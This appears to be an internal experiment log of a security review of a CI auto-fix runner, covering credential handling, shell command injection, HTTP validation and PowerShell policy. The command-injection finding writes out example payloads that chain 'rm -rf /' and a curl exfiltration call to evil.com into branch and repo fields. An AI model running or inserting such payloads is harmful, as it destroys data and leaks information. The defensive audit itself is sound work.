# Experiment H — review-security (rto-test / n8n-ci-autofix)

**Date:** 2026-04-07  
**Project:** rto-test (n8n-ci-autofix)  
**Skill:** review-security  
**Result:** ✅ PASS (with findings)

## Objective

Run review-security on rto-test codebase and verify:
1. Credential/config exposure detection
2. Command injection detection (shell scripts)
3. Input validation issues found
4. Output is actionable

## Security Surface Area

| Area | Files | Risk |
|------|-------|------|
| Config | config.example.env | No real secrets — placeholder only |
| Shell runner | ci-fix-runner.sh | Command injection via git URL |
| HTTP server | runner-server.js | HTTP input validation |
| PowerShell | install.ps1, setup-roadmap-runner.ps1 | Execution policy, privilege escalation |
| Git operations | ci-fix-runner.sh | Branch name injection |

## Test Steps

### H-1: Credential exposure check

config.example.env was reviewed — no real credentials, only placeholders:
```
REPO_OWNER=YourGitHubUser
REPO_NAME=YourRepoName
```

**Result:** ✅ No live credentials found

config.env (actual secrets) is in .gitignore — correctly excluded.

### H-2: Command injection in ci-fix-runner.sh

Review of the git clone and checkout operations:

```bash
git clone "https://github.com/${REPO}.git" "${REPO_DIR}"
cd "${REPO_DIR}"
git checkout "${BRANCH}"
```

**Risk:** `${REPO}` and `${BRANCH}` come from the HTTP payload (POST /fix). If an attacker controls the n8n webhook, they could inject:
- `REPO=evil/repo; rm -rf /` (shell injection via semicolon)
- `BRANCH=main; curl evil.com/exfil` (command chaining)

**Mitigations found:**
- BRANCH is validated only for the recursion guard (`claude-auto-fix-*`)
- No sanitization of git URL or branch name
- WORKSPACE is hardcoded to a specific path — limits blast radius

**Severity:** HIGH if n8n webhook is public; LOW if webhook is internal

### H-3: HTTP server input validation

runner-server.js POST /fix endpoint:
```javascript
const { branch, run_id, repo } = payload;
if (!branch || !run_id || !repo) {
  res.writeHead(400);
  res.end(JSON.stringify({ error: 'Missing required fields: branch, run_id, repo' }));
  return;
}
```

**Result:** ✅ Field presence validated, type checking not done (JSON.parse catches type mismatches)

No DoS protection (request body size limit, activeRuns Map could grow unbounded).

### H-4: PowerShell execution policy

install.ps1:
```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

**Result:** ✅ RemoteSigned is appropriate — local scripts can run, remote must be signed. Not overly permissive.

## Findings

### Finding H-1: No command injection sanitization (HIGH conditional)

The `REPO` and `BRANCH` variables are used directly in shell commands. An attacker who can send HTTP requests to runner-server.js could inject arbitrary shell commands. The n8n instance presumably runs on Caleb's network, which limits exposure.

**Recommendation:** Add input sanitization:
```bash
# Sanitize BRANCH (alphanumeric, dash, underscore only)
if [[ ! "$BRANCH" =~ ^[a-zA-Z0-9_-]+$ ]]; then
  echo "ERROR: Invalid branch name"
  exit 1
fi
```

### Finding H-2: No rate limiting or DoS protection

runner-server.js activeRuns Map grows without bound. A malicious actor could flood it with fake /fix requests, causing memory exhaustion.

**Severity:** LOW — requires local network access to n8n

### Finding H-3: No TLS on runner-server.js

The server listens on plain HTTP (port 3099). Cloudflared tunnel provides transport security, but direct connections would be unencrypted.

**Severity:** LOW — tunnel provides encryption in typical setup

### Finding H-4: ROADMAP_PROJECT_DIR in config.example.env

Points to `C:\Github\Weapons_Lore` — hardcoded Windows path and WEAP-specific. This leaks into the example config.

**Severity:** LOW — it's an example, but could mislead users

## Conclusion

PASS — review-security found real issues:
1. Command injection risk in ci-fix-runner.sh (HIGH conditional)
2. No DoS protection on runner-server.js (LOW)
3. Hardcoded WEAP paths in example config (LOW)
4. ROADMAP_PROJECT_DIR points to Weapons_Lore specifically

The most actionable finding is H-1 — the lack of input sanitization on branch names and repo identifiers.

**Recommendation:** Add input validation to ci-fix-runner.sh for BRANCH and REPO variables before they're used in shell commands
